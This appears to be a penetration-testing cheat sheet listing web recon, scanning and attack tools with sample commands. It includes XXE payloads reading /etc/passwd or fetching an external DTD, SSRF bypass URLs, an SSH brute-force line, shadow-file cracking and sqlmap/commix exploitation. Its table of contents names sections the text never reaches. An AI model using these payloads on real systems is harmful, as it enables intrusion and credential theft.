# Web Attack Cheat Sheet

## Table of Contents
- [Discovering](#Discovering)
  - [Targets](#Targets)
  - [IP Enumeration](#IP-Enumeration)
  - [Subdomain Enumeration](#Subdomain-Enumeration)
  - [Wayback Machine](#Wayback-Machine)
  - [Cache](#Cache)
  - [Crawling](#Crawling)
  - [Wordlist](#Wordlist)
  - [Directory Bruteforcing](#Directory-Bruteforcing)
  - [Parameter Bruteforcing](#Parameter-Bruteforcing)
  - [DNS and HTTP detection](#DNS-and-HTTP-detection)
  - [Acquisitions/Names/Addresses/Contacts/Emails/etc.](#Acquisitions)
  - [HTML/JavaScript Comments](#JavaScript-Comments)
  - [Google Dorks](#Google-Dorks)
  - [Content Security Policy (CSP)](#CSP)
  - [Tiny URLs Services](#Tiny-URLs-Services)
  - [GraphQL](#GraphQL)
  - [General](#General-Discovering)
- [Enumerating](#Enumerating)
  - [Fingerprint](#Fingerprint)
  - [Buckets](#Buckets)
  - [Cloud Enumeration](#Cloud-Enumeration)
  - [Containerization](#Containerization)
  - [Visual Identification](#Visual-Identification)
- [Scanning](#Scanning)
  - [Static Application Security Testing](#Static-Application-Security-Testing)
  - [Dependency Confusion](#Dependency-Confusion)
  - [Send Emails](#Send-Emails)
  - [Search Vulnerabilities](#Search-Vulnerabilities)
  - [Web Scanning](#Web-Scanning)
  - [HTTP Request Smuggling](#HTTP-Request-Smuggling)
  - [Subdomain Takeover](#Subdomain-Takeover)
  - [SQLi (SQL Injection)](#SQLi-Scanning)
  - [Repositories Scanning](#Repositories-Scanning)
  - [Google Dorks Scanning](#Google-Dorks-Scanning)
  - [CORS Misconfigurations](#CORS-Misconfigurations)
- [Monitoring](#Monitoring)
  - [CVE](#CVE)
- [Attacking](#Attacking)
  - [Brute Force](#Brute-Force)
  - [Exfiltration](#Exfiltration)
- [Manual](#Manual)
  - [Payloads](#Payloads)
  - [Deserialization](#Deserialization)
  - [Reusing Cookies](#Reusing-Cookies)
  - [SSRF (Server-Side Request Forgery)](#SSRF)
  - [DNS Rebinding](#DNS-Rebinding)
  - [SMTP Header Injection](#SMTP-Header-Injection)
  - [Reverse Shell](#Reverse-Shell)
  - [SQLi (SQL Injection)](#SQLi-Manual)
  - [SSTI (Server Side Template Injection)](#SSTI)
  - [WebDAV (Web Distributed Authoring and Versioning)](#WebDAV)
  - [Generic Tools](#Generic-Tools)
  - [General](#General-Manual)

## Discovering

### Targets
https://github.com/arkadiyt/bounty-targets-data
<br># This repo contains data dumps of Hackerone and Bugcrowd scopes (i.e. the domains that are eligible for bug bounty reports).

### IP Enumeration
http://www.asnlookup.com
<br># This tool leverages ASN to look up IP addresses (IPv4 & IPv6) owned by a specific organization for reconnaissance purposes.

https://github.com/pielco11/fav-up
<br># Lookups for real IP starting from the favicon icon and using Shodan.
<br>```python3 favUp.py --favicon-file favicon.ico -sc```

https://stackoverflow.com/questions/16986879/bash-script-to-list-all-ips-in-prefix
<br># List all IP addresses in a given CIDR block
<br>```nmap -sL -n 10.10.64.0/27 | awk '/Nmap scan report/{print $NF}'```

### Subdomain Enumeration
https://appsecco.com/books/subdomain-enumeration
<br># This book intendes to be a reference for subdomain enumeration techniques.

https://github.com/OWASP/Amass
<br># The OWASP Amass Project performs network mapping of attack surfaces and external asset discovery using open source information gathering and active reconnaissance techniques.
<br>```amass enum -passive -dir /tmp/amass_output/ -d example.com -o dir/example.com```

https://github.com/projectdiscovery/subfinder
<br># subfinder is a subdomain discovery tool that discovers valid subdomains for websites by using passive online sources.
<br>```subfinder -r 8.8.8.8,8.8.4.4,1.1.1.1,1.0.0.1 -t 10 -v -d example.com -o dir/example.com```

https://github.com/nsonaniya2010/SubDomainizer
<br># SubDomainizer is a tool designed to find hidden subdomains and secrets present is either webpage, Github, and external javascripts present in the given URL.
<br>```python3 SubDomainizer.py -u example.com -o dir/example.com```

https://dns.bufferover.run/dns?q=example.com
<br># Powered by DNSGrep (https://github.com/erbbysam/DNSGrep)
<br># A utility for quickly searching presorted DNS names. Built around the Rapid7 rdns & fdns dataset.

https://crt.sh/?q=example.com
<br># Certificate Search

https://censys.io/certificates?q=parsed.subject_dn%3AO%3DExample+Organization
<br># Censys is the most reputable, exhaustive, and up-to-date source of Internet scan data in the world, so you see everything.

https://www.shodan.io/search?query=ssl%3AExample
<br># Shodan is the world's first search engine for Internet-connected devices.

https://fofa.so
<br># FOFA (Cyberspace Assets Retrieval System) is the world's IT equipment search engine with more complete data coverage, and it has more complete DNA information of global networked IT equipment.

https://www.zoomeye.org
<br># ZoomEyeis China's first and world-renowned cyberspace search engine driven by 404 Laboratory of Knownsec. Through a large number of global surveying and mapping nodes, according to the global IPv4, IPv6 address and website domain name databases，it can continuously scan and identify multiple service port and protocols 24 hours a day, and finally map the whole or local cyberspace.

https://securitytrails.com/list/email/dns-admin.example.com
<br># Total Internet Inventory with the most comprehensive data that informs with unrivaled accuracy.
<br>```curl --request POST --url 'https://api.securitytrails.com/v1/domains/list?apikey={API_Key}&page=1&scroll=true' --data '{"filter":{"apex_domain":"example.com"}}' | jq '.records[].hostname' | sed 's/"//g' >> subdomains.txt```
<br>```curl --request POST --url 'https://api.securitytrails.com/v1/domains/list?apikey={API_Key}&page=1&scroll=true' --data '{"filter":{"whois_email":"domains@example.com"}}' | jq '.records[].hostname' | sed 's/"//g' >> domains.txt```

https://viewdns.info/reversewhois
<br># This free tool will allow you to find domain names owned by an individual person or company.

https://opendata.rapid7.com/
<br># Offering researchers and community members open access to data from Project Sonar, which conducts internet-wide surveys to gain insights into global exposure to common vulnerabilities.

https://github.com/ninoseki/mihari
<br># Mihari is a framework for continuous OSINT based threat hunting.

### Wayback Machine
https://github.com/tomnomnom/waybackurls
<br># Accept line-delimited domains on stdin, fetch known URLs from the Wayback Machine for *.domain and output them on stdout.
<br>```cat subdomains.txt | waybackurls > waybackurls.txt```

https://github.com/tomnomnom/hacks
<br># Hacky one-off scripts, tests etc.
<br>```cat waybackurls.txt | go run /root/Tools/hacks/anti-burl/main.go | tee waybackurls_valid.txt```

### Cache
https://www.giftofspeed.com/cache-checker
<br># This tool lists which web files on a website are cached and which are not. Furthermore it checks by which method these files are cached and what the expiry time of the cached files is.

### Crawling
https://github.com/jaeles-project/gospider
<br># Fast web spider written in Go.
<br>```gospider -s "https://example.com/" -o output -c 20 -d 10```

### Wordlist
https://portswigger.net/bappstore/21df56baa03d499c8439018fe075d3d7
<br># Scrapes all unique words and numbers for use with password cracking.

https://github.com/ameenmaali/wordlistgen
<br># wordlistgen is a tool to pass a list of URLs and get back a list of relevant words for your wordlists.
<br>```cat hosts.txt | wordlistgen```

https://github.com/adamtlangley/gitscraper
<br># A tool which scrapes public github repositories for common naming conventions in variables, folders and files.
<br>```php gitscraper.php {GitHub Username} {GitHub Personal KEY}```

https://github.com/danielmiessler/SecLists
<br># SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.

https://github.com/swisskyrepo/PayloadsAllTheThings
<br># A list of useful payloads and bypasses for Web Application Security. Feel free to improve with your payloads and techniques.

https://github.com/fuzzdb-project/fuzzdb
<br># FuzzDB was created to increase the likelihood of finding application security vulnerabilities through dynamic application security testing.

https://github.com/google/fuzzing
<br># This project aims at hosting tutorials, examples, discussions, research proposals, and other resources related to fuzzing.

https://github.com/xyele/hackerone_wordlist
<br># The wordlists that have been compiled using disclosed reports at the HackerOne bug bounty platform.

https://wordlists.assetnote.io
<br># This website provides you with wordlists that are up to date and effective against the most popular technologies on the internet.

### Directory Bruteforcing
https://github.com/ffuf/ffuf
<br># A fast web fuzzer written in Go.
<br>```ffuf -H 'User-Agent: Mozilla' -v -t 30 -w mydirfilelist.txt -b 'NAME1=VALUE1; NAME2=VALUE2' -u 'https://example.com/FUZZ'```

https://github.com/OJ/gobuster
<br># Gobuster is a tool used to brute-force.
<br>```gobuster dir -a 'Mozilla' -e -k -l -t 30 -w mydirfilelist.txt -c 'NAME1=VALUE1; NAME2=VALUE2' -u 'https://example.com/'```

https://github.com/tomnomnom/meg
<br># meg is a tool for fetching lots of URLs but still being 'nice' to servers.
<br>```meg -c 50 -H 'User-Agent: Mozilla' -s 200 weblogic.txt example.txt weblogic```

https://github.com/deibit/cansina
<br># Cansina is a Web Content Discovery Application.
<br>```python3 cansina.py -u 'https://example.com/' -p mydirfilelist.txt --persist```

https://github.com/epi052/feroxbuster
<br># A simple, fast, recursive content discovery tool written in Rust.
<br>```feroxbuster -u 'https://example.com/' -x pdf -x js,html -x php txt json,docx```

### Parameter Bruteforcing
https://github.com/s0md3v/Arjun
<br># Arjun can find query parameters for URL endpoints.
<br>```arjun -u https://example.com/```

https://github.com/Sh1Yo/x8
<br># Hidden parameters discovery suite written in Rust.
<br>```x8 -u "https://example.com/" -w <wordlist>```

### DNS and HTTP detection
https://ceye.io
<br># Monitor service for security testing.
<br>```curl http://api.ceye.io/v1/records?token={API Key}&type=dns
curl http://api.ceye.io/v1/records?token={API Key}&type=http```

https://portswigger.net/burp/documentation/collaborator
<br># Burp Collaborator is a network service that Burp Suite uses to help discover many kinds of vulnerabilities.
<br># Tip https://www.onsecurity.co.uk/blog/gaining-persistent-access-to-burps-collaborator-sessions

http://pingb.in
<br># Simple DNS and HTTP service for security testing.

https://github.com/ctxis/SnitchDNS
<br># SnitchDNS is a database driven DNS Server with a Web UI, written in Python and Twisted, that makes DNS administration easier with all configuration changed applied instantly without restarting any system services.

http://dnslog.cn
<br># Simple DNS server with realitme logs.

https://interact.projectdiscovery.io/
<br># Interactsh is an Open-Source Solution for Out of band Data Extraction, A tool designed to detect bugs that cause external interactions, For example - Blind SQLi, Blind CMDi, SSRF, etc.

### <a name="Acquisitions"></a>Acquisitions/Names/Addresses/Contacts/Emails/etc.
https://hunter.io
<br># Hunter lets you find email addresses in seconds and connect with the people that matter for your business.

https://intelx.io
<br># Intelligence X is an independent European technology company founded in 2018 by Peter Kleissner. The company is based in Prague, Czech Republic. Its mission is to develop and maintain the search engine and data archive.

https://www.nerdydata.com
<br># Find companies based on their website's tech stack or code.

https://github.com/khast3x/h8mail
<br># h8mail is an email OSINT and breach hunting tool using different breach and reconnaissance services, or local breaches such as Troy Hunt's "Collection1" and the infamous "Breach Compilation" torrent.
<br>```h8mail -t target@example.com```

https://dashboard.fullcontact.com
<br># Our person-first Identity Resolution Platform provides the crucial intelligence needed to drive Media Amplification, Omnichannel Measurement, and Customer Recognition.

https://www.peopledatalabs.com
<br># Our data empowers developers to build innovative, trusted data-driven products at scale.

https://www.social-searcher.com
<br># Free Social Media Search Engine.

https://github.com/mxrch/GHunt
<br># GHunt is an OSINT tool to extract information from any Google Account using an email.
<br>```python3 ghunt.py email myemail@gmail.com```

### <a name="JavaScript-Comments"></a>HTML/JavaScript Comments
https://portswigger.net/support/using-burp-suites-engagement-tools
<br># Burp Engagement Tools

### Google Dorks
https://www.exploit-db.com/google-hacking-database
<br># Google Hacking Database

### <a name="CSP"></a>Content Security Policy (CSP)
https://csp-evaluator.withgoogle.com/
<br># CSP Evaluator allows developers and security experts to check if a Content Security Policy (CSP) serves as a strong mitigation against cross-site scripting attacks.

### Tiny URLs Services
https://www.scribd.com/doc/308659143/Cornell-Tech-Url-Shortening-Research
<br># Cornell Tech Url Shortening Research

https://github.com/utkusen/urlhunter
<br># urlhunter is a recon tool that allows searching on URLs that are exposed via shortener services such as bit.ly and goo.gl.
<br>```urlhunter -keywords keywords.txt -date 2020-11-20 -o out.txt```

https://shorteners.grayhatwarfare.com
<br># Search Shortener Urls

### GraphQL
https://github.com/doyensec/graph-ql
<br># A security testing tool to facilitate GraphQL technology security auditing efforts.

https://hackernoon.com/understanding-graphql-part-1-nxm3uv9
<br># Understanding GraphQL

https://graphql.org/learn/introspection/
<br># It's often useful to ask a GraphQL schema for information about what queries it supports. GraphQL allows us to do so using the introspection system!

https://jondow.eu/practical-graphql-attack-vectors/
<br># Practical GraphQL attack vectors

https://lab.wallarm.com/why-and-how-to-disable-introspection-query-for-graphql-apis/
<br># Why and how to disable introspection query for GraphQL APIs

https://lab.wallarm.com/securing-and-attacking-graphql-part-1-overview/
<br># Securing GraphQL

https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4
<br># GraphQL vs REST API model, common security test cases for GraphQL endpoints.

https://the-bilal-rizwan.medium.com/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696
<br># GraphQL common vulnerabilities & how to exploit them.

### <a name="General-Discovering"></a>General
https://github.com/redhuntlabs/Awesome-Asset-Discovery
<br># Asset Discovery is the initial phase of any security assessment engagement, be it offensive or defensive. With the evolution of information technology, the scope and definition of assets has also evolved.

https://spyse.com
<br># Spyse holds the largest database of its kind, containing a wide range of OSINT data handy for the reconnaissance.

https://github.com/yogeshojha/rengine
<br># reNgine is an automated reconnaissance framework meant for information gathering during penetration testing of web applications.

https://github.com/phor3nsic/favicon_hash_shodan
<br># Search for a framework by favicon

https://github.com/crashbrz/WebXmlExploiter/
<br># The WebXmlExploiter is a tool to exploit exposed by misconfiguration or path traversal web.xml files.

## Enumerating

### Fingerprint
https://github.com/urbanadventurer/WhatWeb
<br># WhatWeb identifies websites. Its goal is to answer the question, "What is that Website?". WhatWeb recognises web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.
<br>```whatweb -a 4 -U 'Mozilla' -c 'NAME1=VALUE1; NAME2=VALUE2' -t 20 www.example.com```

https://builtwith.com
<br># Find out what websites are Built With.

https://www.wappalyzer.com
<br># Identify technologies on websites.

https://webtechsurvey.com
<br># Discover what technologies a website is built on or find out what websites use a particular web technology.

https://portswigger.net/bappstore/c9fb79369b56407792a7104e3c4352fb
<br># Software Vulnerability Scanner Burp Extension

https://github.com/GrrrDog/weird_proxies
<br># It's a cheat sheet about behaviour of various reverse proxies and related attacks.

### Buckets
https://aws.amazon.com/cli/
<br># List s3 bucket permissions and keys
<br>```aws s3api get-bucket-acl --bucket examples3bucketname```
<br>```aws s3api get-object-acl --bucket examples3bucketname --key dir/file.ext```
<br>```aws s3api list-objects --bucket examples3bucketname```
<br>```aws s3api list-objects-v2 --bucket examples3bucketname```
<br>```aws s3api get-object --bucket examples3bucketname --key dir/file.ext localfilename.ext```
<br>```aws s3api put-object --bucket examples3bucketname --key dir/file.ext --body localfilename.ext```

https://github.com/eth0izzle/bucket-stream
<br># Find interesting Amazon S3 Buckets by watching certificate transparency logs

https://buckets.grayhatwarfare.com/
<br># Search Public Buckets

https://github.com/VirtueSecurity/aws-extender
<br># Burp Suite extension which can identify and test S3 buckets

### Cloud Enumeration
https://github.com/andresriancho/enumerate-iam
<br># Found a set of AWS credentials and have no idea which permissions it might have?

https://github.com/nccgroup/ScoutSuite
<br># Scout Suite is an open source multi-cloud security-auditing tool, which enables security posture assessment of cloud environments.

https://github.com/toniblyx/prowler
<br># Prowler is a command line tool that helps you with AWS security assessment, auditing, hardening and incident response.

https://github.com/salesforce/cloudsplaining
<br># Cloudsplaining is an AWS IAM Security Assessment tool that identifies violations of least privilege and generates a risk-prioritized HTML report.

https://github.com/cloudsploit/scans
<br># CloudSploit by Aqua is an open-source project designed to allow detection of security risks in cloud infrastructure accounts, including: Amazon Web Services (AWS), Microsoft Azure, Google Cloud Platform (GCP), Oracle Cloud Infrastructure (OCI), and GitHub. These scripts are designed to return a series of potential misconfigurations and security risks.

https://github.com/RhinoSecurityLabs/pacu
<br># Pacu is an open-source AWS exploitation framework, designed for offensive security testing against cloud environments.

https://github.com/VirtueSecurity/aws-extender
<br># This Burp Suite extension can identify and test S3 buckets as well as Google Storage buckets and Azure Storage containers for common misconfiguration issues using the boto/boto3 SDK library.

https://github.com/irgoncalves/gcp_security
<br># This repository is intented to have Google Cloud Security recommended practices, scripts and more.

https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
<br># Instance metadata is data about your instance that you can use to configure or manage the running instance. Instance metadata is divided into categories, for example, host name, events, and security groups.

https://cloud.google.com/compute/docs/storing-retrieving-metadata
<br># Every instance stores its metadata on a metadata server. You can query this metadata server programmatically, from within the instance and from the Compute Engine API. You can query for information about the instance, such as the instance's host name, instance ID, startup and shutdown scripts, custom metadata, and service account information. Your instance automatically has access to the metadata server API without any additional authorization.

https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
<br># The Azure Instance Metadata Service (IMDS) provides information about currently running virtual machine instances. You can use it to manage and configure your virtual machines. This information includes the SKU, storage, network configurations, and upcoming maintenance events.

https://www.alibabacloud.com/help/doc-detail/49122.htm
<br># Metadata of an instance includes basic information of the instance in Alibaba Cloud, such as the instance ID, IP address, MAC addresses of network interface controllers (NICs) bound to the instance, and operating system type.

https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/
<br># Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments.

### Containerization
https://github.com/stealthcopter/deepce
<br># Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE).

### Visual Identification
https://github.com/FortyNorthSecurity/EyeWitness
<br># EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.
<br>```eyewitness --web --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" --threads 10 --timeout 30 --prepend-https -f "${PWD}/subdomains.txt" -d "${PWD}/eyewitness/"```

https://github.com/michenriksen/aquatone
<br># Aquatone is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface.
<br>```cat targets.txt | aquatone```

https://github.com/sensepost/gowitness
<br># gowitness is a website screenshot utility written in Golang, that uses Chrome Headless to generate screenshots of web interfaces using the command line, with a handy report viewer to process results. Both Linux and macOS is supported, with Windows support mostly working.
<br>```gowitness scan --cidr 192.168.0.0/24 --threads 20```

## Scanning

### Static Application Security Testing
https://github.com/returntocorp/semgrep
<br># Semgrep is a fast, open-source, static analysis tool that excels at expressing code standards — without complicated queries — and surfacing bugs early at editor, commit, and CI time.

### Dependency Confusion
https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
<br># How I Hacked Into Apple, Microsoft and Dozens of Other Companies.

https://github.com/dwisiswant0/nodep
<br># nodep check available dependency packages across npmjs, PyPI or RubyGems registry.

https://github.com/visma-prodsec/confused
<br># A tool for checking for lingering free namespaces for private package names referenced in dependency configuration for Python (pypi) requirements.txt, JavaScript (npm) package.json, PHP (composer) composer.json or MVN (maven) pom.xml.

### Send Emails
https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c
<br># Ticket Trick

https://medium.com/intigriti/abusing-autoresponders-and-email-bounces-9b1995eb53c2
<br># Abusing autoresponders and email bounces

<br># Send multiple emails
<br>```while read i; do echo $i; echo -e "From: example1@gmail.com\nTo: ${i}\nCc: example2@gmail.com\nSubject: This is the subject ${i}\n\nThis is the body ${i}" | ssmtp ${i},example2@gmail.com; done < emails.txt```

### Search Vulnerabilities
https://github.com/vulnersCom/getsploit
<br># Command line search and download tool for Vulners Database inspired by searchsploit.
<br>```getsploit wordpress 4.7.0```

https://www.exploit-db.com/searchsploit
<br># Included in our Exploit Database repository on GitHub is searchsploit, a command line search tool for Exploit-DB that also allows you to take a copy of Exploit Database with you, everywhere you go.
<br>```searchsploit -t oracle windows```

https://github.com/vulmon/Vulmap
<br># Vulmap is an open-source online local vulnerability scanner project. It consists of online local vulnerability scanning programs for Windows and Linux operating systems.

https://grep.app
<br># Search across a half million git repos.

### Web Scanning
https://support.portswigger.net/customer/portal/articles/1783127-using-burp-scanner
<br># Burp Scanner is a tool for automatically finding security vulnerabilities in web applications.

https://github.com/spinkham/skipfish
<br># Skipfish is an active web application security reconnaissance tool.
<br>```skipfish -MEU -S dictionaries/minimal.wl -W new_dict.wl -C "AuthCookie=value" -X /logout.aspx -o output_dir http://www.example.com/```

https://github.com/sullo/nikto
<br># Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software. Scan items and plugins are frequently updated and can be automatically updated.
<br>```nikto -ssl -host www.example.com```

https://github.com/wpscanteam/wpscan
<br># WordPress Security Scanner
<br>```wpscan --disable-tls-checks --ignore-main-redirect --user-agent 'Mozilla' -t 10 --force --wp-content-dir wp-content --url blog.example.com```

https://github.com/droope/droopescan
<br># A plugin-based scanner that aids security researchers in identifying issues with several CMS.
<br>```droopescan scan drupal -u example.com```

https://github.com/projectdiscovery/nuclei
<br># Nuclei is used to send requests across targets based on a template leading to zero false positives and providing fast scanning on large number of hosts.
<br>```nuclei -l urls.txt -t cves/ -t files/ -o results.txt```

https://github.com/six2dez/reconftw
<br># reconFTW is a tool designed to perform automated recon on a target domain by running the best set of tools to perform enumeration and finding out vulnerabilities.
<br>```reconftw.sh -d target.com -a```

https://gobies.org
<br># The new generation of network security technology achieves rapid security emergency through the establishment of a complete asset database for the target.

https://github.com/commixproject/commix
<br># By using this tool, it is very easy to find and exploit a command injection vulnerability in a certain vulnerable parameter or HTTP header.
<br>```python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=127.0.0.1&Submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"```

https://github.com/MrCl0wnLab/ShellShockHunter
<br># Shellshock, also known as Bashdoor, is a family of security bugs in the Unix Bash shell, the first of which was disclosed on 24 September 2014.
<br>```python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 40 --ssl```

### HTTP Request Smuggling
https://github.com/defparam/smuggler
<br># An HTTP Request Smuggling / Desync testing tool written in Python 3.
<br>```python3 smuggler.py -q -u https://example.com/```

https://github.com/BishopFox/h2csmuggler
<br># h2cSmuggler smuggles HTTP traffic past insecure edge-server proxy_pass configurations by establishing HTTP/2 cleartext (h2c) communications with h2c-compatible back-end servers, allowing a bypass of proxy rules and access controls.
<br>```h2csmuggler.py -x https://example.com/ --test```

https://github.com/0ang3el/websocket-smuggle
<br># Smuggling HTTP requests over fake WebSocket connection.

https://portswigger.net/web-security/request-smuggling
<br># HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users.

https://github.com/PortSwigger/http-request-smuggler
<br># This is an extension for Burp Suite designed to help you launch HTTP Request Smuggling attacks, originally created during HTTP Desync Attacks research. It supports scanning for Request Smuggling vulnerabilities, and also aids exploitation by handling cumbersome offset-tweaking for you.

https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142
<br># This is how I was able to exploit a HTTP Request Smuggling in some Mobile Device Management (MDM) servers and send any MDM command to any device enrolled on them for a private bug bounty program.

### Subdomain Takeover
https://github.com/anshumanbh/tko-subs
<br># Subdomain Takeover Scanner
<br>```tko-subs -data providers-data.csv -threads 20 -domains subdomains.txt```

https://github.com/Ice3man543/SubOver
<br># Subover is a Hostile Subdomain Takeover tool originally written in python but rewritten from scratch in Golang. Since it's redesign, it has been aimed with speed and efficiency in mind.
<br>```SubOver -l subdomains.txt```

### <a name="SQLi-Scanning"></a>SQLi (SQL Injection)
https://github.com/sqlmapproject/sqlmap
<br># sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.
<br>```sqlmap --force-ssl -r RAW_REQUEST.txt --user-agent='Mozilla' --batch```
<br>```sqlmap -vv -u 'https://www.example.com?id=1*' --user-agent='Mozilla' --level 5 --risk 3 --batch```

### Repositories Scanning
https://github.com/zricethezav/gitleaks
<br># Gitleaks is a SAST tool for detecting hardcoded secrets like passwords, api keys, and tokens in git repos.
<br>```gitleaks --github-org=organization --threads=4 -v --disk```

https://github.com/michenriksen/gitrob
<br># Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github.

https://github.com/dxa4481/truffleHog
<br># Searches through git repositories for secrets, digging deep into commit history and branches.

https://github.com/awslabs/git-secrets
<br># Prevents you from committing passwords and other sensitive information to a git repository.

https://github.com/eth0izzle/shhgit
<br># shhgit helps secure forward-thinking development, operations, and security teams by finding secrets across their code before it leads to a security breach.

### Google Dorks Scanning
https://github.com/opsdisk/pagodo
<br># The goal of this project was to develop a passive Google dork script to collect potentially vulnerable web pages and applications on the Internet.
<br>```python3 pagodo.py -d example.com -g dorks.txt -l 50 -s -e 35.0 -j 1.1```

### CORS Misconfigurations
https://github.com/s0md3v/Corsy
<br># Corsy is a lightweight program that scans for all known misconfigurations in CORS implementations.
<br>```python3 corsy.py -u https://example.com```

## Monitoring

### CVE
https://www.opencve.io/
<br># OpenCVE (formerly known as Saucs.com) allows you to subscribe to vendors and products, and send you an alert as soon as a CVE is published or updated.

## Attacking

### Brute Force
https://github.com/vanhauser-thc/thc-hydra
<br># Number one of the biggest security holes are passwords, as every password security study shows. This tool is a proof of concept code, to give researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system.
<br>```hydra -l root -P 10-million-password-list-top-1000.txt www.example.com -t 4 ssh```

https://www.openwall.com/john/
<br># John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems.
<br>```unshadow /etc/passwd /etc/shadow > mypasswd.txt```
<br>```john mypasswd.txt```

https://hashcat.net/hashcat/
<br># Hashcat is a password recovery tool.
<br>```hashcat -m 0 -a 0 hashes.txt passwords.txt```

https://github.com/ustayready/fireprox
<br># Rotate the source IP address in order to bypass rate limits

### Exfiltration
https://github.com/vp777/procrustes
<br># A bash script that automates the exfiltration of data over dns

https://github.com/sensepost/reGeorg
<br># The successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.

https://github.com/fbkcs/ThunderDNS
<br># This tool can forward TCP traffic over DNS protocol. Non-compile clients + socks5 support.

## Manual

### Payloads
https://github.com/swisskyrepo/PayloadsAllTheThings
<br># PayloadsAllTheThings

https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html
<br># Unicode normalization good for WAF bypass.
  
<br># XSS
<br>https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
<br># This cross-site scripting (XSS) cheat sheet contains many vectors that can help you bypass WAFs and filters. You can select vectors by the event, tag or browser and a proof of concept is included for every vector.

<br># XXE
<br>https://portswigger.net/web-security/xxe
<br># XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
<br>```<?xml version="1.0" encoding="UTF-8"?>```
<br>```<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>```
<br>```<stockCheck><productId>&xxe;</productId></stockCheck>```

https://phonexicum.github.io/infosec/xxe.html
<br># Information Security PENTEST XXE
<br>```<!DOCTYPE foo SYSTEM "http://xpto.burpcollaborator.net/xpto.dtd">```

https://github.com/GoSecure/dtd-finder
<br># Identify DTDs on filesystem snapshot and build XXE payloads using those local DTDs.

<br># SSRF
<br>https://www.blackhat.com/us-17/briefings.html#a-new-era-of-ssrf-exploiting-url-parser-in-trending-programming-languages
<br># We propose a new exploit technique that brings a whole-new attack surface to bypass SSRF (Server Side Request Forgery) protections.
<br>```http://1.1.1.1&@2.2.2.2#@3.3.3.3/```
<br>```http://127.0.0.1:11211:80/```
<br>```http://google.com#@evil.com/```
<br>```http://foo@evil.com:80@google.com/```
<br>```http://foo@evil.com:80 @google.com/```
<br>```http://127.0.0.1\tfoo.google.com/```
<br>```http://127.0.0.1%09foo.google.com/```
<br>```http://127.0.0.1%2509foo.google.com/```
<br>```http://127.0.0.1:11211#@google.com:80/```
<br>```http://foo@127.0.0.1:11211@google.com:80/```
<br>```http://foo@127.0.0.1 @google.com:11211/```

### Deserialization
https://github.com/joaomatosf/jexboss
<br># JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server and others Java Platforms, Frameworks, Applications, etc.

https://github.com/pimps/JNDI-Exploit-Kit
<br># This is a forked modified version of the great exploitation tool created by @welk1n (https://github.com/welk1n/JNDI-Injection-Exploit). 

### Reusing Cookies
https://medium.com/@ricardoiramar/reusing-cookies-23ed4691122b
<br># This is a story how I accidentally found a common vulnerability across similar web applications just by reusing cookies on different subdomains from the same web application.

### <a name="SSRF"></a>SSRF (Server-Side Request Forgery)
https://lab.wallarm.com/blind-ssrf-exploitation/
<br># There is such a thing as SSRF. There’s lots of information about it, but here is my quick summary.

https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/
<br># A Glossary of Blind SSRF Chains.

### DNS Rebinding
http://rebind.it
<br># Singularity of Origin is a tool to perform DNS rebinding attacks. It includes the necessary components to rebind the IP address of the attack server DNS name to the target machine's IP address and to serve attack payloads to exploit vulnerable software on the target machine.

https://github.com/brannondorsey/dns-rebind-toolkit
<br># DNS Rebind Toolkit is a frontend JavaScript framework for developing DNS Rebinding exploits against vulnerable hosts and services on a local area network (LAN).

https://github.com/brannondorsey/whonow
<br># A malicious DNS server for executing DNS Rebinding attacks on the fly.

https://nip.io
<br># Dead simple wildcard DNS for any IP Address

https://sslip.io
<br># sslip.io is a DNS (Domain Name System) service that, when queried with a hostname with an embedded IP address, returns that IP Address.

http://1u.ms/
<br># This is a small set of zero-configuration DNS utilities for assisting in detection and exploitation of SSRF-related vulnerabilities. It provides easy to use DNS rebinding utility, as well as a way to get resolvable resource records with any given contents.

### SMTP Header Injection
https://www.acunetix.com/blog/articles/email-header-injection/
<br># It is common practice for web pages and web applications to implement contact forms, which in turn send email messages to the intended recipients. Most of the time, such contact forms set headers. These headers are interpreted by the email library on the web server and turned into resulting SMTP commands, which are then processed by the SMTP server.
